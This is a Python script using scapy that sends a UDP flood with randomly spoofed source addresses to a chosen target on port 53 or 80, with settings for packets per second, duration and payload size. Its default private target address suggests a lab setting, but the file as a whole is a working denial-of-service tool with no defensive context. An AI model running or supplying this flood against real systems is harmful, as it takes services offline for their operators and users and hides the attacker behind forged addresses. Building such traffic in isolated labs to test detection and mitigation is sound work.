import argparse
import ipaddress
import random
import time

from scapy.all import IP, UDP, Raw, conf


def random_source_ip(victim_ip):
    while True:
        source_ip = ipaddress.IPv4Address(random.getrandbits(32))
        if source_ip.is_global and source_ip != victim_ip:
            return str(source_ip)


def main():
    parser = argparse.ArgumentParser(description="Send a UDP flood with spoofed source addresses.")
    parser.add_argument("--target", default="10.10.0.3", help="Target IPv4 address")
    parser.add_argument("--port", type=int, default=53, help="Target UDP port (53 or 80)")
    parser.add_argument("--pps", type=int, default=100, help="Packets per second")
    parser.add_argument("--duration", type=float, default=10, help="Flood duration in seconds")
    parser.add_argument("--payload-size", type=int, default=1200, help="UDP payload size in bytes")
    args = parser.parse_args()

    try:
        victim_ip = ipaddress.IPv4Address(args.target)
    except ipaddress.AddressValueError:
        parser.error("--target must be a valid IPv4 address")

    if args.port not in (53, 80):
        parser.error("--port must be 53 or 80")
    if args.pps <= 0:
        parser.error("--pps must be greater than zero")
    if args.duration <= 0:
        parser.error("--duration must be greater than zero")
    if not 1 <= args.payload_size <= 65507:
        parser.error("--payload-size must be between 1 and 65507 bytes")

    print(
        f"Starting UDP flood to {args.target}:{args.port} at {args.pps} PPS "
        f"for {args.duration:g} seconds."
    )
    payload = b"A" * args.payload_size
    interval = 1 / args.pps
    end_time = time.monotonic() + args.duration
    next_send_time = time.monotonic()
    sent = 0
    sender = conf.L3socket()

    try:
        while time.monotonic() < end_time:
            packet = IP(src=random_source_ip(victim_ip), dst=args.target) / UDP(
                sport=random.randint(1024, 65535), dport=args.port
            ) / Raw(load=payload)
            sender.send(packet)
            sent += 1

            next_send_time += interval
            sleep_time = next_send_time - time.monotonic()
            if sleep_time > 0:
                time.sleep(sleep_time)
    finally:
        sender.close()

    print(f"Completed UDP flood. Sent {sent} packets.")


if __name__ == "__main__":
    main()
